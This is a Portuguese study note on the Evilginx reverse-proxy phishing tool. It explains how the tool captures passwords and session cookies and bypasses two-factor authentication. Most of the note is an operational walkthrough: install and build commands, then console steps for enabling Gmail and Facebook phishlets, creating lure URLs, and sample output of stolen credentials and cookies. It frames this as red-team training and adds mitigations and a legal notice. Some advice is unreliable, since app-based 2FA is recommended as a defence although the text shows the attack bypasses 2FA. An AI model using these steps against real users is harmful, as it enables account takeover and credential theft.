2025-06-29 11:45

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Pentest]] | [[Ferramentas]] | [[Evilginx]] | [[Phishing]]

----
# Introdução

O **Evilginx** é uma ferramenta avançada de **phishing** que atua como um **proxy reverso**  entre a vítima e um serviço legítimo (como Gmail, Facebook, LinkedIn, etc.). Ele permite capturar credenciais, cookies de sessão e até burlar autenticação em dois fatores (2FA) sem qua a vítima perceba.

Diferente de páginas de phishing tradicionais, o Evilginx <font color="#ffc000"><strong>não exige que a vítima digite suas credenciais em um site falso</strong></font>. Em vez disso ele intercepta a comunicação real entre o usuário e o serviço legítimo, tornando o ataque muito mais difícil de ser detectado.

![[Pasted image 20250629114937.png]]

---
# Para que serve o Evilginx?

- **Capturar credenciais** ** (usuário e senha) em tempo real.
- **Roubar cookies de sessão** (permite acesso à conta sem senha).
- **Burlar autenticação em dois fatores (2FA)**.
- **Realizar ataques de phishing altamente convincentes.**
- **Testes de segurança (Red Team/ Pentest)** para avaliar a resistência de uma organização a ataques de phishing.

---
# Como o Evilginx Funciona?

O Evilginx funciona como um **proxy intermediário** entre a vítima e o serviço legítimo. Quando a vítima acessa um domínio controlado pelo atacante (ex: `login-gmail.com`), o Evilginx:

1. **Encaminha a requisição** para o serviço real (Gmail).
2. **Intercepta a resposta** e modifica os links para apontar para o servidor do atacante.
3. **Captura cookies e credenciais** quando a vítima faz login.
4. **Repassa a autenticação** para o serviço real, evitando suspeitas.

Isso permite que o atacante **rouba a sessão ativa** sem qua vítima perceba.

![[Pasted image 20250629115338.png]]

---
# Instalação e Configuração

O Evilginx é executado em **Linux** e requer:

- Um servidor com **DNS configurado** (para domínios falsos).
- **Certificado SSL** (para evitar alertas de HTTPS inválido).

## Passo 1: Instalar Dependências (Ubuntu/Debian)

```bash
sudo apt update
sudo apt install git make golan-go
```

## Passo 2: Clonar e Compilar o Evilginx

```bash
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
```

## Passo 3: Configurar o Evilginx

```bash
./evilginx -p ./phishlets/ -config ./configs/
```

- `phislets/`: Contém modelos de phishing (Gmail, Facebook, etc.).
- `configs/`: Armazena configurações de domínio e certificado.

---
# Exemplos Práticos de Uso

## Exemplo 1: Phishing do Gmail

### 1. Configurar um Phishlet do Gmail

```bash
./evilginx
> phishlets hostname gmail meu-phishing.com
> phishlets enable gmail
```

**Saída:**

```bash
[+] Phishlet 'gmail' enabled.
[+] Hostname set to 'meu-phishing.com'.
```

### 2. Iniciar o Evilginx

```bash
> lures create gmail
> lures get-url 1
```

**Saída:**

```bash
[+] Lure URL: https://meu-phishing.com/login
```

### 3. Vítima Acessa o Link

Quando a vítima acessa `https://meu-phishing.com/login`, o Evilginx mostra:

```bash
[+] [gmail] New session captured:
    Email: usuario@exemplo.com
    Password: SenhaSecreta123
    Cookie: __Secure-3PSID=AbCdEfGhIjKlMnOpQrStUvWxYz...
```

---
## Exemplo 2: Roubo de Sessão do Facebook

### 1. Habilitar Phishlet do Facebook

```bash
> phishlets hostname facebook phishing-facebook.com
> phishlets enable facebook
```

**Saída:**

```bash
[+] Phishlet 'facebook' enabled
[+] Hostname set to 'phishing-facebook.com'
```

### 2. Criar uma Isca (Lure)

```bash
> lures create facebook
> lures get-url 1
```

**Saída:**

```bash
[+] [facebook] Session stolen:
    Cookie: sb=XYZ123...; fr=ABC456...; c_user=10001234...
```

Com esses cookies, o atacante pode acessar a conta sem senha.

---
# Usos em Cibersegurança

## 1. Testes de Phishing (Red Team)

- Simular ataques reais para avaliar a conscientização dos usuários.

## 2. Análise de Vulnerabilidades em SSO (OAuth, SAML)

- Verificar se tokens de sessão estão sendo validados corretamente.

## 3. Bypass de 2FA (Autenticação em Dois Fatores)

- Capturar cookies de sessão ativa, evitando a necessidade do segundo fator.

## 4. Engenharia Social Avançada

- Personalizar páginas de phishing para alvos específicos (spear phishing).

## 5. Pesquisa em Segurança Ofensiva

- Estudar técnicas de MITM (Man-in-The-Middle) em cenários controlados.

---
# Mitigações e Defesas

## Como se Proteger do Evilginx?

- **Verificar sempre a URL** (domínios falsos podem ter erros sutis).
- **Usar autenticação em dois fatores (2FA) baseada em app** (não SMS).
- **Monitorar sessões ativas** (verificar logins suspeitos).
- **Treinamento de conscientização** para evitar clicar em links desconhecidos.

---
# Conclusão

O Evilginx é uma ferramenta **poderosa e perigosa** usada tanto por **pentesters** quanto por **criminosos**. Seu diferencial é a capacidade de **roubar sessões sem exigir que a vítima digite credenciais manualmente**, tornando-o muito mais eficaz que phishing tradicional.


>[!warning] Aviso Legal
>O  uso do Evilginx **sem permissão explícita é ilegal**. Este documento tem fins **educacionais e de testes autorizados**.

